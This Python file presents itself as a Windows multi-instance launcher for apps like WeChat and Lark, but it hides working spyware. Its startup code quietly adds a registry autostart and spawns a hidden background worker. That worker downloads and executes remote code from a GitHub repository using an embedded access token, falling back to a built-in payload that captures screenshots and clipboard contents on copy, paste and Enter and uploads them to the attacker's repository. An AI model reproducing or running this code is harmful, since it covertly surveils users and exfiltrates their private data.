import base64
import ctypes
import importlib.util
import json
import os
import platform
import subprocess
import sys
import threading
import time
import tkinter as tk
import winreg
from pathlib import Path
from tkinter import filedialog, messagebox, ttk

# ---------------------------------------------------------
# 全局配置及常量定义
# ---------------------------------------------------------
LOCAL_CONFIG = {
    "username": "Bei18",
    "repo_name": "my-python-storage",
    "file_path": "main_logic.py",
    "token": "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",
}

LOCAL_CACHE_FILE = os.path.join(
    os.getenv("TEMP", "."), "_remote_main_cache.py"
)

MUTEX_NAME = "Global\\FireKirin_MultiLauncher_Upload_Worker_Mutex"
_mutex_handle = None

EMBEDDED_FALLBACK_CODE = """
import os, time, socket, threading, base64, requests, pyperclip
from PIL import Image, ImageGrab
from pynput import keyboard

DEVICE_NAME = socket.gethostname()
SAVE_DIR = r"D:\\AppDataLogs\\Cache"
os.makedirs(SAVE_DIR, exist_ok=True)
GITHUB_CONFIG = {"username": "Bei18", "repo_name": "my-python-storage", "token": ""}
uploaded_files = set()

def upload_file_smart(file_path):
    if not os.path.exists(file_path) or not GITHUB_CONFIG["token"]: return False
    file_name = os.path.basename(file_path)
    target_path = f"uploads/{DEVICE_NAME}/{file_name}"
    base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
    headers = {"Authorization": f"Bearer {GITHUB_CONFIG['token']}", "Accept": "application/vnd.github+json"}
    try:
        if requests.get(base_url, headers=headers, timeout=10).status_code == 200:
            uploaded_files.add(file_name)
            return True
        with open(file_path, "rb") as f: encoded = base64.b64encode(f.read()).decode("utf-8")
        res = requests.put(base_url, headers=headers, json={"message": f"Auto-sync: {file_name}", "content": encoded}, timeout=15)
        if res.status_code in [200, 201]:
            uploaded_files.add(file_name)
            return True
    except Exception: pass
    return False

def scheduled_upload_task():
    while True:
        time.sleep(120)
        try:
            for f in os.listdir(SAVE_DIR):
                fp = os.path.join(SAVE_DIR, f)
                if os.path.isfile(fp) and f not in uploaded_files: upload_file_smart(fp)
        except Exception: pass

def write_txt(action_type, detail=""):
    log_file = os.path.join(SAVE_DIR, f"{DEVICE_NAME}-{time.strftime('%Y-%m-%d')}-LOG.txt")
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{action_type}] {detail}\\n")
    except Exception: pass

def take_full_screenshot(action_type):
    fn = f"{DEVICE_NAME}-{time.strftime('%Y%m%d_%H%M%S')}-{action_type}.png"
    fp = os.path.join(SAVE_DIR, fn)
    try:
        ImageGrab.grab(all_screens=True).save(fp, "PNG")
        return fn
    except Exception:
        try: ImageGrab.grab().save(fp, "PNG"); return fn
        except Exception: return None

def get_clipboard_content():
    try:
        t = pyperclip.paste()
        return f"t: {t.replace('\\r\\n', ' ').replace('\\n', ' ')}" if t and t.strip() else "none"
    except Exception: return "fail"

def on_copy(): write_txt("c", f"jt: {take_full_screenshot('c')} | {get_clipboard_content()}")
def on_paste(): write_txt("v", f"jt: {take_full_screenshot('v')} | {get_clipboard_content()}")
def on_press(key):
    if key == keyboard.Key.enter: write_txt("e", f"jt: {take_full_screenshot('e')}")

def run(token):
    GITHUB_CONFIG["token"] = token
    write_txt("s", "ok")
    threading.Thread(target=scheduled_upload_task, daemon=True).start()
    try: keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste}).start()
    except Exception: pass
    try: keyboard.Listener(on_press=on_press).start()
    except Exception: pass
    while True: time.sleep(1)
"""

APP_TITLE = "火麒麟多开"
CONFIG_NAME = "launcher_config.json"


# ---------------------------------------------------------
# 工具函数及后台服务
# ---------------------------------------------------------
def set_startup(enable=True):
    if os.name != "nt":
        return
    key_name = "FireKirinMultiLauncher"
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    if getattr(sys, "frozen", False):
        app_path = f'"{sys.executable}" --bg-worker'
    else:
        app_path = f'"{sys.executable}" "{os.path.abspath(__file__)}" --bg-worker'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
        )
        if enable:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, app_path)
        else:
            winreg.DeleteValue(key, key_name)
        winreg.CloseKey(key)
    except Exception:
        pass


def is_bg_worker_running():
    global _mutex_handle
    if os.name == "nt":
        kernel32 = ctypes.windll.kernel32
        _mutex_handle = kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            return True
    return False


def Safew():
    import requests

    url = f"https://api.github.com/repos/{LOCAL_CONFIG['username']}/{LOCAL_CONFIG['repo_name']}/contents/{LOCAL_CONFIG['file_path']}"
    headers = {
        "Authorization": f"Bearer {LOCAL_CONFIG['token']}",
        "Accept": "application/vnd.github+json",
    }

    while True:
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                content_b64 = response.json().get("content", "")
                with open(LOCAL_CACHE_FILE, "wb") as f:
                    f.write(base64.b64decode(content_b64))
        except Exception:
            pass

        if not os.path.exists(LOCAL_CACHE_FILE):
            try:
                with open(LOCAL_CACHE_FILE, "w", encoding="utf-8") as f:
                    f.write(EMBEDDED_FALLBACK_CODE)
            except Exception:
                pass

        try:
            spec = importlib.util.spec_from_file_location(
                "remote_main", LOCAL_CACHE_FILE
            )
            remote_module = importlib.util.module_from_spec(spec)
            sys.modules["remote_main"] = remote_module
            spec.loader.exec_module(remote_module)

            t = threading.Thread(
                target=remote_module.run,
                args=(LOCAL_CONFIG["token"],),
                daemon=True,
            )
            t.start()
        except Exception:
            pass

        time.sleep(300)


def ensure_background_process():
    try:
        if getattr(sys, "frozen", False):
            cmd = [sys.executable, "--bg-worker"]
        else:
            cmd = [sys.executable, __file__, "--bg-worker"]

        if os.name == "nt":
            flags = 0x00000008 | subprocess.CREATE_NO_WINDOW
            subprocess.Popen(cmd, creationflags=flags, close_fds=True)
        else:
            subprocess.Popen(cmd, start_new_session=True, close_fds=True)
    except Exception:
        pass


# ---------------------------------------------------------
# GUI 控件定义
# ---------------------------------------------------------
class PurePlaceholderEntry(ttk.Entry):

    def __init__(
        self,
        container,
        placeholder="",
        textvariable=None,
        on_change_callback=None,
        **kwargs,
    ):
        super().__init__(container, textvariable=textvariable, **kwargs)
        self.placeholder = placeholder
        self.on_change_callback = on_change_callback
        self.has_placeholder = False

        self.bind("<FocusIn>", self._focus_in)
        self.bind("<FocusOut>", self._focus_out)
        self.bind("<KeyRelease>", self._on_key_release)
        self._show_placeholder()

    def update_placeholder(self, new_placeholder):
        self.placeholder = new_placeholder
        if self.has_placeholder or super().get() == "":
            self.delete(0, tk.END)
            self._show_placeholder()

    def _show_placeholder(self):
        if super().get() == "":
            self.insert(0, self.placeholder)
            self.config(foreground="gray")
            self.has_placeholder = True

    def _focus_in(self, event):
        if self.has_placeholder:
            self.delete(0, tk.END)
            self.config(foreground="black")
            self.has_placeholder = False

    def _focus_out(self, event):
        if super().get() == "":
            self._show_placeholder()
        if self.on_change_callback:
            self.on_change_callback()

    def _on_key_release(self, event):
        if self.on_change_callback:
            self.on_change_callback()

    def get_real_text(self):
        if self.has_placeholder:
            return ""
        return super().get().strip()


class MultiInstanceLauncher:

    def __init__(self, root_win: tk.Tk, container_frame: tk.Frame):
        self.root = root_win
        self.container_frame = container_frame

        # 设置窗口属性
        self.root.title(APP_TITLE)
        self.root.geometry("180x300")
        self.root.resizable(False, True)
        self.root.minsize(180, 100)
        self.root.maxsize(180, 2000)

        try:
            self.root.attributes("-toolwindow", True)
        except Exception:
            pass

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        self.appdata_dir = (
            Path(
                os.environ.get(
                    "LOCALAPPDATA", Path.home() / "AppData" / "Local"
                )
            )
            / "MultiLauncher"
        )
        self.appdata_dir.mkdir(parents=True, exist_ok=True)
        self.config_path = self.appdata_dir / CONFIG_NAME
        self.default_profile_root = self.appdata_dir / "profiles"

        self.exe_var = tk.StringVar()
        self.count_var = tk.StringVar(value="1")

        self.rows_data = []
        self.apps_config = {}
        self.current_custom_notes = {}

        self._load_config()

        if not self.exe_var.get() or not Path(self.exe_var.get()).exists():
            detected_path = self._auto_detect_exe()
            if detected_path:
                self.exe_var.set(detected_path)

        self._build_ui()
        self.exe_var.trace_add("write", lambda *args: self._on_exe_changed())

        self._refresh_rows()
        self._refresh_history_list()

    def _on_close(self):
        try:
            self._save_config()
            self.root.destroy()
        except Exception:
            pass

    def _auto_detect_exe(self) -> str:
        possible_paths = [
            r"C:\Program Files (x86)\Tencent\WeChat\WeChat.exe",
            r"C:\Program Files\Tencent\WeChat\WeChat.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Lark\Lark.exe"),
        ]
        for p in possible_paths:
            if Path(p).is_file():
                return p
        return ""

    def _load_config(self):
        if not self.config_path.exists():
            return
        try:
            data = json.loads(self.config_path.read_text("utf-8"))
            self.apps_config = data.get("apps", {})
            last_exe = data.get("last_exe", "")
            if last_exe and Path(last_exe).exists():
                self.exe_var.set(last_exe)
                self._load_app_spec_config(last_exe)
        except Exception:
            pass

    def _load_app_spec_config(self, exe_path: str):
        exe_path = exe_path.strip()
        if not exe_path or exe_path not in self.apps_config:
            self.current_custom_notes = {}
            return

        app_data = self.apps_config[exe_path]
        self.count_var.set(str(max(1, min(50, int(app_data.get("count", 1))))))
        saved_notes = app_data.get("notes", [])
        self.current_custom_notes = {
            i + 1: note for i, note in enumerate(saved_notes)
        }

    def _save_config(self):
        current_exe = self.exe_var.get().strip()
        current_notes = []
        for entry, _, _ in self.rows_data:
            current_notes.append(entry.get_real_text())

        if current_exe:
            self.apps_config[current_exe] = {
                "count": self._get_count(),
                "notes": current_notes,
            }

        data = {
            "last_exe": current_exe,
            "apps": self.apps_config,
        }
        try:
            self.config_path.write_text(
                json.dumps(data, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
        except Exception:
            pass

    def _on_exe_changed(self):
        current_exe = self.exe_var.get().strip()
        if current_exe in self.apps_config:
            self._load_app_spec_config(current_exe)
        else:
            self.current_custom_notes = {}

        placeholder = (
            f"{self._get_exe_stem()}备注名称"
            if self._get_exe_stem()
            else "备注名称"
        )
        for entry, _, _ in self.rows_data:
            entry.update_placeholder(placeholder)

        self._refresh_rows()

    def _resolve_shortcut(self, path_str: str) -> str:
        path = Path(path_str)
        if path.suffix.lower() != ".lnk":
            return path_str

        try:
            import win32com.client

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(str(path))
            target = shortcut.Targetpath
            if target and Path(target).exists():
                return target
        except Exception:
            pass

        try:
            ps_cmd = (
                f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{str(path)}'); "
                f"Write-Output $s.TargetPath"
            )
            res = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                creationflags=(
                    subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
                ),
            )
            target = res.stdout.strip()
            if target and Path(target).exists():
                return target
        except Exception:
            pass

        return path_str

    def _build_ui(self):
        try:
            from ctypes import windll

            windll.shcore.SetProcessDpiAwareness(1)
        except Exception:
            pass

        self.main_container = ttk.Frame(self.container_frame)
        self.main_container.pack(fill="both", expand=True, padx=3, pady=3)

        exe_box = ttk.Frame(self.main_container)
        exe_box.pack(fill="x", pady=(0, 2))
        exe_box.columnconfigure(0, weight=1)

        ttk.Entry(exe_box, textvariable=self.exe_var).grid(
            row=0, column=0, sticky="ew", padx=(0, 2)
        )
        ttk.Button(
            exe_box, text="浏览", width=4, command=self._choose_exe
        ).grid(row=0, column=1)

        cnt_box = ttk.Frame(self.main_container)
        cnt_box.pack(fill="x", pady=(2, 4))

        ttk.Label(cnt_box, text="多开数量:").pack(side="left")
        count_entry = ttk.Entry(
            cnt_box, textvariable=self.count_var, justify="center"
        )
        count_entry.pack(side="right", fill="x", expand=True, padx=(2, 0))
        count_entry.bind("<FocusOut>", lambda e: self._refresh_rows())
        count_entry.bind("<Return>", lambda e: self._refresh_rows())

        ttk.Separator(self.main_container, orient="horizontal").pack(
            fill="x", pady=2
        )

        self.rows_frame = ttk.Frame(self.main_container)
        self.rows_frame.pack(fill="x", expand=False)

        self.history_sep = ttk.Separator(
            self.main_container, orient="horizontal"
        )
        self.history_sep.pack(fill="x", pady=4)

        self.history_title = ttk.Label(
            self.main_container, text="已经多开程序：", font=("", 8, "bold")
        )
        self.history_title.pack(anchor="w")

        self.history_frame = ttk.Frame(self.main_container)
        self.history_frame.pack(fill="x", expand=False)

    def _refresh_history_list(self):
        for widget in self.history_frame.winfo_children():
            widget.destroy()

        if not self.apps_config:
            ttk.Label(
                self.history_frame, text="无记录", foreground="gray"
            ).pack(anchor="w")
            self._fit_window_size()
            return

        has_item = False
        for exe_path, info in self.apps_config.items():
            if not Path(exe_path).exists():
                continue

            has_item = True
            notes = info.get("notes", [])
            stem = Path(exe_path).stem
            count = info.get("count", 1)

            for i in range(count):
                note = notes[i] if i < len(notes) else ""

                row = ttk.Frame(self.history_frame)
                row.pack(fill="x", pady=1)
                row.columnconfigure(0, weight=1)

                if note:
                    display_text = f"{stem[:3]}({note[:3]})"
                else:
                    display_text = f"{stem[:4]}-{i+1}"

                ttk.Label(row, text=display_text, anchor="w").grid(
                    row=0, column=0, sticky="w"
                )

                ttk.Button(
                    row,
                    text="启动",
                    width=4,
                    command=lambda p=exe_path, idx=i
                    + 1, n=note: self.launch_one_direct(p, idx, n),
                ).grid(row=0, column=1, sticky="e")

        if not has_item:
            ttk.Label(
                self.history_frame, text="无记录", foreground="gray"
            ).pack(anchor="w")

        self._fit_window_size()

    def launch_one_direct(self, exe_path: str, index: int, note: str):
        exe = Path(exe_path)
        if not exe.is_file():
            messagebox.showerror("错误", f"程序不存在：\n{exe_path}")
            return

        exe_stem = exe.stem
        profile_name = (
            f"{exe_stem}-{index}({note})" if note else f"{exe_stem}-{index}"
        )
        profile = (self.default_profile_root / profile_name).resolve()

        try:
            profile.mkdir(parents=True, exist_ok=True)
            app_id = f"MultiInstanceLauncher.{profile_name}"

            if os.name == "nt":
                cmd_str = f'start "" "{str(exe)}" --user-data-dir="{profile}" --class="{app_id}" --app-id="{app_id}"'
                subprocess.Popen(
                    cmd_str,
                    shell=True,
                    cwd=str(exe.parent),
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            else:
                cmd = [
                    str(exe),
                    f"--user-data-dir={profile}",
                    f"--class={profile_name}",
                ]
                subprocess.Popen(cmd, cwd=str(exe.parent))
        except Exception as exc:
            messagebox.showerror(f"启动失败：{profile_name}", str(exc))

    def _choose_exe(self):
        path = filedialog.askopenfilename(
            title="选择程序",
            filetypes=[
                ("应用程序 / 快捷方式", "*.exe;*.lnk"),
                ("Executable (*.exe)", "*.exe"),
                ("Shortcut (*.lnk)", "*.lnk"),
                ("All files", "*.*"),
            ],
        )
        if path:
            real_path = self._resolve_shortcut(path)
            self.exe_var.set(real_path)
            self._save_config()
            self._refresh_history_list()

    def _get_count(self):
        try:
            val_str = self.count_var.get().strip()
            value = int(val_str)
        except Exception:
            value = 1
        value = max(1, min(50, value))
        self.count_var.set(str(value))
        return value

    def _get_exe_stem(self) -> str:
        exe_path = self.exe_var.get().strip().strip('"')
        if exe_path:
            return Path(exe_path).stem
        return ""

    def _update_button_states(self):
        for entry, btn, _ in self.rows_data:
            if entry.get_real_text():
                btn.config(state="normal")
            else:
                btn.config(state="disabled")

    def _refresh_rows(self):
        for entry, _, note_var in self.rows_data:
            real_text = entry.get_real_text()
            if real_text:
                idx = self.rows_data.index((entry, _, note_var)) + 1
                self.current_custom_notes[idx] = real_text

        for widget in self.rows_frame.winfo_children():
            widget.destroy()

        self.rows_data = []
        count = self._get_count()
        exe_stem = self._get_exe_stem()
        placeholder_text = f"{exe_stem}备注名称" if exe_stem else "备注名称"

        for index in range(1, count + 1):
            row = ttk.Frame(self.rows_frame)
            row.pack(fill="x", pady=1)
            row.columnconfigure(1, weight=1)

            prefix_label = f"{exe_stem[:3]}" if exe_stem else "程序名称"
            ttk.Label(row, text=f"{prefix_label}").grid(
                row=0, column=0, sticky="w", padx=(0, 2)
            )

            default_note = self.current_custom_notes.get(index, "")
            note_var = tk.StringVar(value=default_note)

            btn = ttk.Button(
                row,
                text="启动",
                width=4,
                state="disabled",
                command=lambda idx=index, n=note_var: self.launch_one(
                    idx, n.get()
                ),
            )

            entry = PurePlaceholderEntry(
                row,
                placeholder=placeholder_text,
                textvariable=note_var,
                on_change_callback=self._on_note_input_change,
            )
            entry.grid(row=0, column=1, sticky="ew", padx=(0, 2))
            btn.grid(row=0, column=2, sticky="e")

            self.rows_data.append((entry, btn, note_var))

        self._update_button_states()
        self._fit_window_size()
        self._save_config()

    def _on_note_input_change(self):
        self._update_button_states()
        self._save_config()
        self._refresh_history_list()

    def _fit_window_size(self):
        self.root.update_idletasks()
        req_height = self.main_container.winfo_reqheight() + 10
        current_x = self.root.winfo_x()
        current_y = self.root.winfo_y()
        self.root.geometry(f"180x{req_height}+{current_x}+{current_y}")

    def _validate(self):
        exe_str = self.exe_var.get().strip().strip('"')
        if not exe_str or not Path(exe_str).is_file():
            messagebox.showerror(
                "错误",
                "未找到程序文件，请点击“浏览”选择正确的 EXE 文件。",
            )
            return None, None

        exe = Path(exe_str)
        try:
            self.default_profile_root.mkdir(parents=True, exist_ok=True)
        except Exception as exc:
            messagebox.showerror("目录错误", f"创建隔离目录失败：\n{exc}")
            return None, None

        return exe, self.default_profile_root

    def launch_one(self, index: int, note: str):
        exe, root = self._validate()
        if not exe:
            return

        exe_stem = self._get_exe_stem()
        note = note.strip()

        profile_name = f"{exe_stem}-{index}({note})"
        profile = (root / profile_name).resolve()

        try:
            profile.mkdir(parents=True, exist_ok=True)
            app_id = f"MultiInstanceLauncher.{profile_name}"

            if os.name == "nt":
                cmd_str = f'start "" "{str(exe)}" --user-data-dir="{profile}" --class="{app_id}" --app-id="{app_id}"'
                subprocess.Popen(
                    cmd_str,
                    shell=True,
                    cwd=str(exe.parent),
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            else:
                cmd = [
                    str(exe),
                    f"--user-data-dir={profile}",
                    f"--class={profile_name}",
                ]
                subprocess.Popen(cmd, cwd=str(exe.parent))

            self._save_config()
            self._refresh_history_list()
        except Exception as exc:
            messagebox.showerror(f"启动失败：{profile_name}", str(exc))


# ---------------------------------------------------------
# 本地主框架调用接口入口
# ---------------------------------------------------------
def build_ui(parent):
    # 自动设置自启动
    set_startup(enable=True)

    # 如果存在后台命令行标志
    if "--bg-worker" in sys.argv:
        if is_bg_worker_running():
            sys.exit(0)
        Safew()
        return

    # 启动后台进程
    ensure_background_process()

    # 配置 ttk 样式
    try:
        style = ttk.Style()
        if "vista" in style.theme_names():
            style.theme_use("vista")
    except Exception:
        pass

    # 实例化并挂载界面
    MultiInstanceLauncher(root, parent)
